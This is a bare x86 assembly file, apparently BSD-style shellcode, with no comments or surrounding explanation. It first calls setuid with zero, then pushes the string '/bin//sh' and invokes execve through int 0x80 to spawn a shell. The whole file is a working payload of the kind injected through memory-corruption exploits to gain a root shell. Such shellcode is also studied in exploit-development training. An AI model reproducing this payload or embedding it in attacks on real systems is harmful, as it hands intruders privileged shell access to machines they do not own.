global start


start:

   xor eax, eax
   push 0x00
   mov eax, 0x17
   sub esp,0x04
   int 0x80
   add esp,0x0C


   xor eax,eax
   push eax
   push dword 0x68732f2f
   push dword 0x6e69622f
   mov ebx,esp
   push eax
   push eax
   push ebx
   mov al,0x3b
   push byte 0x2a
   int 0x80

